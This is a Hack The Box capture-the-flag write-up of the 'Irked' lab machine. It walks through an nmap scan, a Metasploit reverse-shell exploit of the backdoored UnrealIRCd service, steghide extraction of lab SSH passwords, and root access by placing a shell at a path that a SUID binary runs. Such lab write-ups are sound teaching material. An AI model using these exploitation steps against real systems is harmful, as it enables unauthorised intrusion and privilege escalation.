---
layout: single
title: Irked - Hack The Box
excerpt: "Irked is an easy box running a backdoored UnrealIRC installation. I used a Metasploit module to get a shell then ran `steghide` to obtain the SSH credentials for the low privileged user then got root by exploiting a vulnerable SUID binary."
date: 2019-04-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-irked/irked_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - ctf
  - stego
  - cve
  - metasploit
  - suid
---

![](/assets/images/htb-writeup-irked/irked_logo.png)

Irked is an easy box running a backdoored UnrealIRC installation. I used a Metasploit module to get a shell then ran `steghide` to obtain the SSH credentials for the low privileged user then got root by exploiting a vulnerable SUID binary.

## Tools/Exploits/CVEs used

- steghide
- metasploit

## Summary

- UnrealIRCd MSF exploit for initial foothold
- steghide encoded file containing password for user
- SUID binary for priv esc

### Nmap

Aside from the typical Apache and OpenSSH services, I noticed that UnrealIRCd is installed.

```
# nmap -p- -sC -sV 10.10.10.117
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-17 14:02 EST
Nmap scan report for 10.10.10.117
Host is up (0.019s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33436/udp  status
|_  100024  1          50397/tcp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
50397/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Webpage

The main page just has a picture and a note about IRC.

![](/assets/images/htb-writeup-irked/web.png)

### UnrealIRCd exploitation

The box is running UnrealIRCd and searchsploit shows there's an MSF exploit for it:
```
root@ragingunicorn:~/Downloads# searchsploit unrealirc
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)
```

Getting a shell with Metasploit is easy:
```
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.117     yes       The target address range or CIDR identifier
   RPORT   8067             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.23      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 10.10.14.23:4444 
[*] 10.10.10.117:8067 - Connected to 10.10.10.117:8067...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:8067 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo O1zcz5ML2uK8OjPk;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "O1zcz5ML2uK8OjPk\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.10.14.23:4444 -> 10.10.10.117:58328) at 2018-11-17 14:08:40 -0500
```

I have a shell as user `ircd`:
```
python -c 'import pty;pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

The `djmardov` user home directroy has a `.backup` file that contains the password for some stego encoded file:
```
djmardov@irked:~/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
djmardov@irked:~/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Password: `UPupDOWNdownLRlrBAbaSSss`

Since the note mentionned stego and this box is rated as easy, I guessed that it would be an off-the-shelf tool like `steghide` and not some custom obfuscation. The hidden file is found in the `irked.jpg` image from the main page and the steg doesn't use any passphrase.
```
root@ragingunicorn:~/Downloads# steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".
root@ragingunicorn:~/Downloads# 
root@ragingunicorn:~/Downloads# cat pass.txt
Kab6h+m+bbp2J:HG
```

djmardov's password is: `Kab6h+m+bbp2J:HG`

I can SSH in and get the user flag:

```console
djmardov@irked:~/Documents$ cat user.txt
cat user.txt
4a66a7...
```

### Priv esc

I found a suspicious SUID file: `/usr/bin/viewuser`

```console
djmardov@irked:~$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
```

When I execute the file, I see it runs `/tmp/listusers`

```
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-11-17 13:54 (:0)
djmardov pts/1        2018-11-17 14:19 (10.10.14.23)
sh: 1: /tmp/listusers: not found
```

Since it's a running as root and I have write access to `tmp` I can just copy `/bin/sh` to `/tmp/listusers` and gain root

```console
djmardov@irked:~$ cp /bin/sh /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-11-17 13:54 (:0)
djmardov pts/1        2018-11-17 14:19 (10.10.14.23)
# cd /root
# cat root.txt
8d8e9e...
```